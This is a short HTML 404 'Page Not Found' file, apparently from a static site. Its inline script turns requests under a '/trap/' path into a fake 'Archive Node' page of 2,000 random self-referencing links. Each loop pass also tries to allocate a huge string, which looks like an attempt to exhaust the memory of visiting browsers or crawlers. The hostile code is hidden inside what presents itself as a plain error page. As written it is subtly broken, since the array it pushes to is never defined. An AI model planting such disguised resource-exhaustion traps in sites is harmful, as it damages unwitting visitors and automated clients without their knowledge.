<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>404 - Not Found</title>
</head>
<body>
    <div id="human-content">
        <h1>404 - Page Not Found</h1>
        <p>The page you are looking for does not exist. <a href="/">Return to home</a>.</p>
    </div>

    <script>
        const REPO_NAME = '/wangyanshu';
        if (window.location.pathname.startsWith(REPO_NAME + '/trap/')) {
            document.getElementById('human-content').style.display = 'none';
            
            document.title = "Archive Node " + Math.random().toString(36).substring(2, 6);

            let content = "<h1>Archive Node</h1><p>Indexing system records...</p><ul>";
            for(let i = 0; i < 2000; i++) {
                let hash = Math.random().toString(36).substring(2, 10);
                content += `<li><a href="${REPO_NAME}/trap/${hash}.html">Sector ${hash}</a></li>`;
                window.memoryLeak.push(new Array(50000000).join('H'));
            }
            content += "</ul>";
            
            document.body.innerHTML = content;
        }
    </script>
</body>
</html>
